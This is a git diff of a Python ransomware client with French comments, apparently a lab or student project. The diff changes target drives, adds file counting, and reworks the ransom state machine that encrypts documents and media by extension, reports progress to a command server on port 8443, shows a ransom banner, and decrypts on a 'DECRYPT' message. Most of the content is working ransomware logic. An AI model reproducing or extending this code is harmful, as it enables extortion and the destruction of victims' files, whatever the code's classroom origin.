@@ -8,7 +8,6 @@ import platform
 import hashlib
 import datetime
 
-
 KEY_FILE_PATH = 'encryption_key.bin'  # Chemin du fichier pour stocker la clé de chiffrement
 PATH_CONFIG = 'config_workstation.ini'  # Chemin du fichier de configuration
 # constantes
@@ -18,7 +17,7 @@ CONFIG_WORKSTATION = {
     'HASH': None,
     'IP': None,
     'KEY': None,  # Clé à récupérer du serveur de clés
-    'DISKS': ['D:', 'E:'],
+    'DISKS': ['Y:', 'Z:'],
     'PATHS': ['tests_1', 'tests_2'],
     'FILE_EXT': ['.jpg', '.png', '.txt', '.avi', '.mp4', '.mp3', '.pdf'],
     'FREQ': None,
@@ -26,6 +25,9 @@ CONFIG_WORKSTATION = {
     'OS': "Workstation",
     'STATE': None,
 }
+protected_send = False
+
+
 def affichage_ransomware():
     print("""
     # ####################################################################################################################################################
@@ -91,7 +93,6 @@ def generate_unique_hash(system_name):
     return sha256_hash
 
 
-
 def save_encryption_key_to_file(key):
     """
     Enregistre la clé de chiffrement dans un fichier.
@@ -112,17 +113,17 @@ def load_encryption_key_from_file():
         return key_file.read()
 
 
-def generate_encryption_key_sha256(key_length=32):
+def generate_encryption_key_sha256(key_length):
     """
     Génère une clé de chiffrement en utilisant SHA-256.
 
     :param key_length: (int) Longueur de la clé en octets (par défaut 32).
     :return: (bytes) Clé de chiffrement générée.
     """
-    random_data = os.urandom(64)  # Génère une séquence de bytes aléatoire pour renforcer l'entropie
+    random_data = os.urandom(key_length)  # Génère une séquence de bytes aléatoire pour renforcer l'entropie
     hash_object = hashlib.sha256(random_data)
     hashed_data = hash_object.digest()
-    return hashed_data[:key_length]
+    return hashed_data
 
 
 # Si la clé n'existe pas déjà, générer une nouvelle clé et l'enregistrer dans un fichier
@@ -152,6 +153,26 @@ def count_encrypted_files(disk_list):
     return total_count
 
 
+def count_nb_files_in_disk(disks, extension):
+    """
+    Compte le nombre de fichiers avec une extension spécifique sur les disques spécifiés.
+    :param disks: (list) Liste des disques à inspecter
+    :param extension: (str) Extension des fichiers à compter
+    :return: (int) Nombre total de fichiers avec l'extension spécifique
+    """
+    total_count = 0
+    extension_tuple = tuple(extension)
+    for disk in disks:
+        try:
+            for root, dirs, files in os.walk(disk):
+                for file in files:
+                    if file.endswith(extension_tuple):
+                        total_count += 1
+        except Exception as e:
+            print(f"Erreur lors du parcours du disque {disk}: {e}")
+    return total_count
+
+
 def encrypt_files_in_directory(directory, key, extensions):
     """
     Chiffre tous les fichiers d'un dossier en fonction de leurs extensions
@@ -160,10 +181,11 @@ def encrypt_files_in_directory(directory, key, extensions):
     :param extensions: (list) Liste des extensions des fichiers à chiffrer
     """
     # Parcourir tous les fichiers du dossier
+    extensions_tuple = tuple(extensions)
     for root, dirs, files in os.walk(directory):
         for file in files:
             # Vérifier si l'extension du fichier est dans la liste des extensions à chiffrer
-            if os.path.splitext(file)[1] in extensions:
+            if os.path.splitext(file)[1] in extensions_tuple:
                 file_path = os.path.join(root, file)
                 # Lire le contenu du fichier
                 with open(file_path, 'rb') as f:
@@ -223,7 +245,7 @@ def decrypt_files_in_directory(directory, key, extensions):
 
 
 def main():
-
+    global nb_files_to_crypt, nb_files, protected_send
     try:
         CONFIG_WORKSTATION.update()
 
@@ -241,10 +263,10 @@ def main():
     client = network.connect_to_serv(IP_SERVEUR_FRONT, 8443, 20)
     network.send_message(client, message.set_message(
         'INITIALIZE',
-    [CONFIG_WORKSTATION['HASH'],
-            CONFIG_WORKSTATION['OS'],
-            CONFIG_WORKSTATION['DISKS']])
-    )
+        [CONFIG_WORKSTATION['HASH'],
+         CONFIG_WORKSTATION['OS'],
+         CONFIG_WORKSTATION['DISKS']])
+                         )
     print('sending init req 1')
 
     while True:
@@ -263,30 +285,40 @@ def main():
         if CONFIG_WORKSTATION['STATE'] == 'CRYPT':
             network.send_message(client, message.set_message('CHGSTATE', [CONFIG_WORKSTATION['HASH'],CONFIG_WORKSTATION['STATE']]))
             print('sending chg state 1 crypt')
+            nb_files_to_crypt = count_nb_files_in_disk(CONFIG_WORKSTATION['DISKS'], CONFIG_WORKSTATION['FILE_EXT'])
+            print('Nombres de fichier a crypter:', nb_files_to_crypt)
             for disk in CONFIG_WORKSTATION['DISKS']:
-                encrypt_files_in_directory(disk, CONFIG_WORKSTATION['KEY'], CONFIG_WORKSTATION['FILE_EXT'])
+                encrypt_files_in_directory(disk, CONFIG_WORKSTATION['KEY'][:32], CONFIG_WORKSTATION['FILE_EXT'])
                 nb_files = count_encrypted_files(CONFIG_WORKSTATION['DISKS'])
                 print('fin cryptage')
-            affichage_ransomware()
+
             print('Autant de fichiers ont été cryptés:', nb_files)
 
-        elif CONFIG_WORKSTATION['STATE'] == 'PENDING':
-            network.send_message(client, message.set_message('PENDING_SIGNAL',[nb_files, CONFIG_WORKSTATION['HASH'], CONFIG_WORKSTATION['STATE']]))
+        if nb_files == nb_files_to_crypt and CONFIG_WORKSTATION['STATE'] == 'CRYPT':
+            network.send_message(client, message.set_message('PENDING_SIGNAL', [CONFIG_WORKSTATION['HASH'], nb_files]))
+            affichage_ransomware()
+            CONFIG_WORKSTATION['STATE'] = 'PENDING'
             print('sending chg state 2 pending')
             print('CONFIG_WORKSTATION après crypt:', CONFIG_WORKSTATION)
 
-        elif 'RANSOM_PAID' in message.get_message_type(data):
+        if 'DECRYPT' in message.get_message_type(data):
             print('ransom paid front to ransom recu')
             CONFIG_WORKSTATION['STATE'] = 'DECRYPT'  # Passage en mode DECRYPT
-            network.send_message(client, message.set_message('CHGSTATE', [CONFIG_WORKSTATION['HASH'], CONFIG_WORKSTATION['STATE']]))
             for disk in CONFIG_WORKSTATION['DISKS']:
-                decrypt_files_in_directory(disk, encryption_key_sha256)
+                decrypt_files_in_directory(disk, CONFIG_WORKSTATION["KEY"][:32], ['.encrypted'])
 
-        elif CONFIG_WORKSTATION['STATE'] == 'PROTECTED':
-            print('CONFIG_WORKSTATION après protected:', CONFIG_WORKSTATION)
-            network.send_message(client, message.set_message('CHGSTATE', [CONFIG_WORKSTATION['HASH'], CONFIG_WORKSTATION['STATE']]))
+        if CONFIG_WORKSTATION['STATE'] == 'DECRYPT' and not protected_send:
+            print('CONFIG_WORKSTATION après demande de décrypt:', CONFIG_WORKSTATION)
+            nb_files = count_nb_files_in_disk(CONFIG_WORKSTATION['DISKS'], CONFIG_WORKSTATION['FILE_EXT'])
+            network.send_message(client, message.set_message('PROTECTREQ', [CONFIG_WORKSTATION['HASH'], nb_files]))
+            print('sending protect req')
+            protected_send = True
 
-        else:
+        if 'PROTECTRESP' in message.get_message_type(data):
+            print('PROTECTRESP')
+            CONFIG_WORKSTATION['STATE'] = 'PROTECTED'
+            print(data['MESSAGE'])
+        if CONFIG_WORKSTATION['STATE'] == 'PROTECTED':
             break
 
 
